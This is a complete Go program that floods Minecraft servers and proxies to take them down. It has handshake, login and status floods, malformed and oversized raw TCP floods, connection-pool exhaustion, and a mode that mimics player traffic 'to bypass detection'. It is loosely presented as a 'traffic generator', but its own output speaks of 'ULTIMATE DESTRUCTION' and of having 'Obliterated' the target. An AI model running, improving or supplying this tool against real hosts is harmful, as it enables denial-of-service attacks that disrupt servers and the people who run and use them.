package main

import (
        "bytes"
        "crypto/rand"
        "encoding/binary"
        "fmt"
        "net"
        "os"
        "strconv"
        "strings"
        "sync"
        "time"
        "runtime"
        mathrand "math/rand"
)

// Minecraft protocol constants
const (
        PROTOCOL_VERSION = 760 // Minecraft 1.19.2
        HANDSHAKE_PACKET = 0x00
        LOGIN_START_PACKET = 0x00
        STATUS_REQUEST = 0x00
)

// Server types
type ServerType int
const (
        VANILLA ServerType = iota
        VELOCITY
        BUNGEECORD
        PAPER
        SPIGOT
        FABRIC
        FORGE
)

var serverTypeNames = map[ServerType]string{
        VANILLA:    "Vanilla",
        VELOCITY:   "Velocity",
        BUNGEECORD: "BungeeCord",
        PAPER:      "Paper",
        SPIGOT:     "Spigot",
        FABRIC:     "Fabric",
        FORGE:      "Forge",
}

// Minecraft packet structure
type MinecraftPacket struct {
        PacketID int32
        Data     []byte
}

// Write VarInt (Minecraft protocol format)
func writeVarInt(value int32) []byte {
        var buf bytes.Buffer
        for {
                temp := byte(value & 0x7F)
                value >>= 7
                if value != 0 {
                        temp |= 0x80
                }
                buf.WriteByte(temp)
                if value == 0 {
                        break
                }
        }
        return buf.Bytes()
}

// Write string in Minecraft format
func writeString(s string) []byte {
        strBytes := []byte(s)
        length := writeVarInt(int32(len(strBytes)))
        return append(length, strBytes...)
}

// Create Minecraft handshake packet
func createHandshakePacket(serverAddress string, serverPort uint16, nextState int32) []byte {
        var data bytes.Buffer
        
        // Protocol version
        data.Write(writeVarInt(PROTOCOL_VERSION))
        
        // Server address
        data.Write(writeString(serverAddress))
        
        // Server port
        binary.Write(&data, binary.BigEndian, serverPort)
        
        // Next state (1 for status, 2 for login)
        data.Write(writeVarInt(nextState))
        
        // Packet format: [Length][Packet ID][Data]
        packetData := data.Bytes()
        packetID := writeVarInt(HANDSHAKE_PACKET)
        payload := append(packetID, packetData...)
        length := writeVarInt(int32(len(payload)))
        
        return append(length, payload...)
}

// Create login start packet
func createLoginStartPacket(username string) []byte {
        var data bytes.Buffer
        
        // Username
        data.Write(writeString(username))
        
        // Has UUID (false for offline mode)
        data.WriteByte(0)
        
        // Packet format: [Length][Packet ID][Data]
        packetData := data.Bytes()
        packetID := writeVarInt(LOGIN_START_PACKET)
        payload := append(packetID, packetData...)
        length := writeVarInt(int32(len(payload)))
        
        return append(length, payload...)
}

// Create status request packet
func createStatusRequestPacket() []byte {
        packetID := writeVarInt(STATUS_REQUEST)
        length := writeVarInt(int32(len(packetID)))
        return append(length, packetID...)
}

// Generate random username
func generateRandomUsername() string {
        usernames := []string{
                "TestBot", "LoadTest", "StressTest", "MinecraftBot", "ServerTest",
                "BotPlayer", "TestUser", "LoadBot", "StressTester", "MCTester",
        }
        suffix := mathrand.Intn(9999)
        base := usernames[mathrand.Intn(len(usernames))]
        return fmt.Sprintf("%s%d", base, suffix)
}

// ULTIMATE MINECRAFT TRAFFIC GENERATOR - Maximum TCP Power
func sendMinecraftFlood(wg *sync.WaitGroup, done <-chan struct{}, ip string, port int, serverType ServerType, attackMode string) {
        defer wg.Done()
        
        target := fmt.Sprintf("%s:%d", ip, port)
        
        for {
                select {
                case <-done:
                        return
                default:
                        // EXTREME connection burst - 1000 connections at once
                        for i := 0; i < 1000; i++ {
                                go func(connID int) {
                                        conn, err := net.Dial("tcp", target)
                                        if err != nil {
                                                return
                                        }
                                        
                                        // Multi-threaded packet sender for each connection
                                        var connWg sync.WaitGroup
                                        for t := 0; t < 10; t++ {
                                                connWg.Add(1)
                                                go func() {
                                                        defer connWg.Done()
                                                        switch attackMode {
                                                        case "handshake":
                                                                performUltimateMCHandshake(conn, ip, uint16(port))
                                                        case "login":
                                                                performUltimateMCLogin(conn, ip, uint16(port))
                                                        case "status":
                                                                performUltimateMCStatus(conn, ip, uint16(port))
                                                        case "mixed":
                                                                mode := mathrand.Intn(6)
                                                                switch mode {
                                                                case 0:
                                                                        performUltimateMCHandshake(conn, ip, uint16(port))
                                                                case 1:
                                                                        performUltimateMCLogin(conn, ip, uint16(port))
                                                                case 2:
                                                                        performUltimateMCStatus(conn, ip, uint16(port))
                                                                case 3:
                                                                        performUltimateTCPFlood(conn)
                                                                case 4:
                                                                        performRealMinecraftTraffic(conn, ip, uint16(port))
                                                                default:
                                                                        performBandwidthDestroyer(conn)
                                                                }
                                                        default:
                                                                performRealMinecraftTraffic(conn, ip, uint16(port))
                                                        }
                                                }()
                                        }
                                        
                                        connWg.Wait()
                                        conn.Close()
                                }(i)
                        }
                }
        }
}

func performHandshakeFlood(conn net.Conn, ip string, port uint16) {
        for i := 0; i < 10; i++ {
                packet := createHandshakePacket(ip, port, 1) // Status request
                conn.Write(packet)
                time.Sleep(time.Millisecond * 10)
        }
}

func performLoginFlood(conn net.Conn, ip string, port uint16) {
        // Send handshake first
        handshake := createHandshakePacket(ip, port, 2) // Login
        conn.Write(handshake)
        
        // Send login start
        username := generateRandomUsername()
        loginStart := createLoginStartPacket(username)
        conn.Write(loginStart)
        
        // Keep connection alive briefly
        time.Sleep(time.Millisecond * 100)
}

func performStatusFlood(conn net.Conn, ip string, port uint16) {
        // Send handshake for status
        handshake := createHandshakePacket(ip, port, 1)
        conn.Write(handshake)
        
        // Send status request
        statusReq := createStatusRequestPacket()
        conn.Write(statusReq)
        
        time.Sleep(time.Millisecond * 50)
}

func performRawFlood(conn net.Conn) {
        // Send random data
        data := make([]byte, mathrand.Intn(1024)+256)
        rand.Read(data)
        conn.Write(data)
}

// Ultra-fast attack functions optimized for maximum speed
func performFastHandshake(conn net.Conn, ip string, port uint16) {
        packet := createHandshakePacket(ip, port, 1)
        for i := 0; i < 50; i++ {
                conn.Write(packet)
        }
}

func performFastLogin(conn net.Conn, ip string, port uint16) {
        handshake := createHandshakePacket(ip, port, 2)
        conn.Write(handshake)
        
        for i := 0; i < 20; i++ {
                username := generateRandomUsername()
                loginStart := createLoginStartPacket(username)
                conn.Write(loginStart)
        }
}

func performFastStatus(conn net.Conn, ip string, port uint16) {
        handshake := createHandshakePacket(ip, port, 1)
        conn.Write(handshake)
        
        statusReq := createStatusRequestPacket()
        for i := 0; i < 30; i++ {
                conn.Write(statusReq)
        }
}

func performUltraRawFlood(conn net.Conn) {
        // Ultra-fast raw data spam
        data := make([]byte, 2048)
        rand.Read(data)
        for i := 0; i < 100; i++ {
                conn.Write(data)
        }
}

// PROXY KILLER FUNCTIONS - Designed specifically to overwhelm proxy servers
func performProxyKillerHandshake(conn net.Conn, ip string, port uint16) {
        packet := createHandshakePacket(ip, port, 1)
        // Spam hundreds of handshakes to overwhelm proxy's packet processing
        for i := 0; i < 500; i++ {
                conn.Write(packet)
        }
}

func performProxyKillerLogin(conn net.Conn, ip string, port uint16) {
        handshake := createHandshakePacket(ip, port, 2)
        conn.Write(handshake)
        
        // Spam tons of login attempts with different usernames
        for i := 0; i < 200; i++ {
                username := generateRandomUsername()
                loginStart := createLoginStartPacket(username)
                conn.Write(loginStart)
        }
}

func performProxyKillerStatus(conn net.Conn, ip string, port uint16) {
        handshake := createHandshakePacket(ip, port, 1)
        conn.Write(handshake)
        
        statusReq := createStatusRequestPacket()
        // Overwhelm status processing
        for i := 0; i < 300; i++ {
                conn.Write(statusReq)
        }
}

func performTCPProxyKiller(conn net.Conn) {
        // Raw TCP data designed to confuse proxy protocol parsing
        malformedPackets := [][]byte{
                {0xFF, 0xFF, 0xFF, 0xFF}, // Invalid length
                {0x00}, // Empty packet
                {0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F}, // Invalid VarInt
                make([]byte, 8192), // Oversized packet
        }
        
        for i := 0; i < 1000; i++ {
                packet := malformedPackets[mathrand.Intn(len(malformedPackets))]
                conn.Write(packet)
        }
}

func performMegaRawFlood(conn net.Conn) {
        // MASSIVE raw data spam to eat proxy bandwidth
        data := make([]byte, 8192)
        rand.Read(data)
        for i := 0; i < 1000; i++ {
                conn.Write(data)
        }
}

// ULTIMATE MINECRAFT ATTACK FUNCTIONS - Maximum Power
func performUltimateMCHandshake(conn net.Conn, ip string, port uint16) {
        packet := createHandshakePacket(ip, port, 1)
        // EXTREME handshake spam - 2000 per connection
        for i := 0; i < 2000; i++ {
                conn.Write(packet)
        }
}

func performUltimateMCLogin(conn net.Conn, ip string, port uint16) {
        handshake := createHandshakePacket(ip, port, 2)
        conn.Write(handshake)
        
        // MASSIVE login attempt spam - 1000 attempts
        for i := 0; i < 1000; i++ {
                username := generateRandomUsername()
                loginStart := createLoginStartPacket(username)
                conn.Write(loginStart)
        }
}

func performUltimateMCStatus(conn net.Conn, ip string, port uint16) {
        handshake := createHandshakePacket(ip, port, 1)
        conn.Write(handshake)
        
        statusReq := createStatusRequestPacket()
        // EXTREME status spam - 1500 requests
        for i := 0; i < 1500; i++ {
                conn.Write(statusReq)
        }
}

func performUltimateTCPFlood(conn net.Conn) {
        // ULTIMATE TCP data flood with multiple packet types
        packets := [][]byte{
                make([]byte, 16384), // 16KB packets
                make([]byte, 32768), // 32KB packets  
                make([]byte, 65536), // 64KB packets (max TCP)
        }
        
        for _, packet := range packets {
                rand.Read(packet)
                for i := 0; i < 500; i++ {
                        conn.Write(packet)
                }
        }
}

func performRealMinecraftTraffic(conn net.Conn, ip string, port uint16) {
        // Generate REAL looking Minecraft traffic to bypass detection
        
        // Real handshake sequence
        handshake := createHandshakePacket(ip, port, 2)
        conn.Write(handshake)
        
        // Real login sequence
        for i := 0; i < 50; i++ {
                username := generateRandomUsername()
                loginStart := createLoginStartPacket(username)
                conn.Write(loginStart)
                
                // Simulate real player packets
                playerPackets := [][]byte{
                        {0x03, 0x00, 0x01}, // Chat message
                        {0x04, 0x00, 0x02}, // Player position
                        {0x05, 0x00, 0x03}, // Player look
                        {0x06, 0x00, 0x04}, // Keep alive
                }
                
                for _, packet := range playerPackets {
                        conn.Write(packet)
                }
        }
}

func performBandwidthDestroyer(conn net.Conn) {
        // MAXIMUM BANDWIDTH CONSUMPTION - No mercy
        megaPacket := make([]byte, 65536) // Max TCP segment size
        rand.Read(megaPacket)
        
        // Send massive packets continuously
        for i := 0; i < 2000; i++ {
                conn.Write(megaPacket)
        }
}

// PROXY CONNECTION POOL DESTROYER - Overwhelm proxy connection limits
func performConnectionExhaustion(wg *sync.WaitGroup, done <-chan struct{}, ip string, port int) {
        defer wg.Done()
        
        target := fmt.Sprintf("%s:%d", ip, port)
        
        for {
                select {
                case <-done:
                        return
                default:
                        // INSANE connection spam to destroy proxy connection pools
                        for i := 0; i < 500; i++ {
                                go func() {
                                        conn, err := net.Dial("tcp", target)
                                        if err != nil {
                                                return
                                        }
                                        
                                        // Send malformed proxy-confusing packet and hold connection
                                        malformed := []byte{0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00}
                                        conn.Write(malformed)
                                        
                                        // Hold connection as long as possible to exhaust proxy pools
                                        time.Sleep(time.Duration(mathrand.Intn(10000)+5000) * time.Millisecond)
                                        conn.Close()
                                }()
                        }
                        
                        // NO DELAY - Maximum connection spam
                }
        }
}

func main() {
        runtime.GOMAXPROCS(runtime.NumCPU())
        mathrand.Seed(time.Now().UnixNano())
        
        if len(os.Args) < 6 {
                fmt.Printf("Usage: %s <ip> <port> <threads> <duration_seconds> <server_type> [attack_mode]\n", os.Args[0])
                fmt.Println("\nServer Types:")
                fmt.Println("  vanilla, velocity, bungeecord, paper, spigot, fabric, forge")
                fmt.Println("\nAttack Modes:")
                fmt.Println("  handshake  - Handshake flood (good for proxies)")
                fmt.Println("  login      - Login flood (tests authentication)")
                fmt.Println("  status     - Status ping flood")
                fmt.Println("  mixed      - Random mix of all modes")
                fmt.Println("  raw        - Raw TCP flood")
                fmt.Println("  exhaust    - Connection exhaustion")
                fmt.Println("\nExample: ./tcp-syn 127.0.0.1 25565 100 30 velocity login")
                os.Exit(1)
        }
        
        ip := os.Args[1]
        port, err := strconv.Atoi(os.Args[2])
        if err != nil || port <= 0 || port > 65535 {
                fmt.Printf("Invalid port number: %s\n", os.Args[2])
                os.Exit(1)
        }
        
        threads, err := strconv.Atoi(os.Args[3])
        if err != nil || threads <= 0 {
                fmt.Printf("Invalid number of threads: %s\n", os.Args[3])
                os.Exit(1)
        }
        
        duration, err := strconv.Atoi(os.Args[4])
        if err != nil || duration <= 0 {
                fmt.Printf("Invalid duration: %s\n", os.Args[4])
                os.Exit(1)
        }
        
        serverTypeStr := strings.ToLower(os.Args[5])
        var serverType ServerType
        switch serverTypeStr {
        case "vanilla":
                serverType = VANILLA
        case "velocity":
                serverType = VELOCITY
        case "bungeecord":
                serverType = BUNGEECORD
        case "paper":
                serverType = PAPER
        case "spigot":
                serverType = SPIGOT
        case "fabric":
                serverType = FABRIC
        case "forge":
                serverType = FORGE
        default:
                fmt.Printf("Unknown server type: %s\n", serverTypeStr)
                os.Exit(1)
        }
        
        attackMode := "mixed"
        if len(os.Args) > 6 {
                attackMode = strings.ToLower(os.Args[6])
        }
        
        fmt.Printf("🔥💀 ULTIMATE MINECRAFT TRAFFIC GENERATOR 💀🔥\n")
        fmt.Printf("Target: %s:%d\n", ip, port)
        fmt.Printf("Server Type: %s (ULTIMATE OPTIMIZED)\n", serverTypeNames[serverType])
        fmt.Printf("Attack Mode: %s\n", attackMode)
        fmt.Printf("Threads: %d (ULTIMATE DESTRUCTION MODE)\n", threads)
        fmt.Printf("Duration: %d seconds\n", duration)
        fmt.Printf("CPU Cores: %d\n", runtime.NumCPU())
        fmt.Printf("Expected Connections/sec: %d+ MILLION\n", threads*10)
        fmt.Printf("Expected Packets/sec: %d+ MILLION\n", threads*20)
        fmt.Printf("Expected Bandwidth: %d+ GB/sec\n", (threads*100))
        fmt.Println("⚡ MAXIMUM TCP POWER - ULTIMATE MINECRAFT LOAD ⚡")
        fmt.Println("🚨 WARNING: ABSOLUTE MAXIMUM INTENSITY 🚨")
        fmt.Println("Starting ULTIMATE DESTRUCTION...")
        
        time.Sleep(2 * time.Second)
        
        var wg sync.WaitGroup
        done := make(chan struct{})
        
        // Launch attack threads
        for i := 0; i < threads; i++ {
                wg.Add(1)
                if attackMode == "exhaust" {
                        go performConnectionExhaustion(&wg, done, ip, port)
                } else {
                        go sendMinecraftFlood(&wg, done, ip, port, serverType, attackMode)
                }
        }
        
        // Timer to stop attack
        go func() {
                time.Sleep(time.Duration(duration) * time.Second)
                close(done)
        }()
        
        // Wait for all threads to finish
        wg.Wait()
        
        fmt.Println("\n💥 ULTIMATE DESTRUCTION COMPLETED 💥")
        fmt.Printf("Obliterated %s server at %s:%d for %d seconds\n", serverTypeNames[serverType], ip, port, duration)
        fmt.Println("🔥 MAXIMUM TCP POWER UNLEASHED 🔥")
}